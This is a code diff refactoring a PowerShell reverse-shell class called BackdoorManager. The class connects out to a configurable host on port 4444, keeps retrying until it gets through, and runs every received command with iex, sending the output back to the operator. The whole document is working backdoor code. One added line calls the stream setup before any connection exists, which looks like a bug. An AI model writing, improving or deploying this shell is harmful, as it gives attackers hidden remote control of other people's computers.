@@ -108,9 +108,7 @@ function print_help() {
 
 class BackdoorManager {
     
-    # !!!!  DO NOT CHANGE THIS RUN backdoor.py !!!!
-    [string]$UserDefinedIPAddress = "0.0.0.0";
-    # !!!!  DO NOT CHANGE THIS RUN backdoor.py !!!!
+    [string]$UserDefinedIPAddress = "0.0.0.0"
     [int]$UserDefinedPort = 4444;
 
     $activeStream;
@@ -123,23 +121,29 @@ class BackdoorManager {
 
     waitForConnection() {
         $this.activeClient = $false;
-        while ($this.activeClient -eq $false) {
+        while ($true) {
             try {
                 $this.activeClient = New-Object Net.Sockets.TcpClient($this.UserDefinedIPAddress, $this.UserDefinedPort);
+                break;
             } catch [System.Net.Sockets.SocketException] {
-                $this.activeClient = $false;
+                Start-Sleep -Seconds 5;
             }
         }
+        $this.createTextStream();
     }
 
-    createBackdoorConnection() {
-        $this.waitForConnection();
+    createTextStream() {
         $this.activeStream = $this.activeClient.GetStream();
         $this.textBuffer = New-Object Byte[] $this.readCount;
         $this.textEncoding = New-Object Text.UTF8Encoding;
         $this.sessionWriter = New-Object IO.StreamWriter($this.activeStream, [Text.Encoding]::UTF8, $this.readCount);
         $this.sessionReader = New-Object System.IO.StreamReader($this.activeStream);
         $this.sessionWriter.AutoFlush = $true;
+
+    }
+
+    createBackdoorConnection() {
+        $this.waitForConnection();
         $this.handleActiveClient();
 
     }
@@ -151,6 +155,35 @@ class BackdoorManager {
         } catch [System.Management.Automation.MethodInvocationException] {
             $this.createBackdoorConnection();
         }
+    }
+
+    [string] readFromStream() {
+        try {
+            $rawResponse = $this.activeStream.Read($this.textBuffer, 0, $this.readCount)    
+            $response = ($this.textEncoding.GetString($this.textBuffer, 0, $rawResponse))
+            return $response;
+            } catch [System.Management.Automation.MethodInvocationException] {
+                $this.createBackdoorConnection();
+                return "";
+        }
+    }
+
+    [string] getCommand($command) {
+        try { 
+            $output = iex $command | Out-String
+        } catch {
+            $e = $_.Exception
+            $msg = $e.Message
+            $output = "`n$msg`n"  
+        }
+        return $output;
+    }
+
+    [string] createPrompt() {
+        $currentUser = [Environment]::UserName;
+        $computerName = [System.Net.Dns]::GetHostName();
+        $pwd = Get-Location;
+        return "$currentUser@$computerName [$pwd]~$ ";
     }
 
     handleActiveClient() {
@@ -167,26 +200,14 @@ class BackdoorManager {
   | |__||__| |       [*] Today's Date: $(date)
   |__________|`n`n")
         while ($this.activeClient.Connected) {
-            $currentUser = [Environment]::UserName
-            $computerName = [System.Net.Dns]::GetHostName()
-            $pwd = Get-Location
-            $prompt = "$currentUser@$computerName [$pwd]~$ "
-            $this.writeToStream($prompt)         
-            $rawResponse = $this.activeStream.Read($this.textBuffer, 0, $this.readCount)    
-            $response = ($this.textEncoding.GetString($this.textBuffer, 0, $rawResponse))
+            $this.writeToStream($this.createPrompt())         
+            $response = $this.readFromStream();
             $output = "`n"
             if ([string]::IsNullOrEmpty($response)) {
                 continue
             }
-            try { 
-                $output = iex $response | Out-String
-                $this.writeToStream($output + "`n")
-            } catch {
-                $e = $_.Exception
-                $msg = $e.Message
-                $output = "`n$msg`n"  
-                $this.writeToStream($output + "`n")
-            }
+            $output = $this.getCommand($response);
+            $this.writeToStream($output + "`n")
             $this.activeStream.Flush()
         }
             $this.activeClient.Close()
@@ -195,4 +216,5 @@ class BackdoorManager {
 }
 
 $backdoor = [BackdoorManager]::new()
+$backdoor.createTextStream();
 $backdoor.createBackdoorConnection()
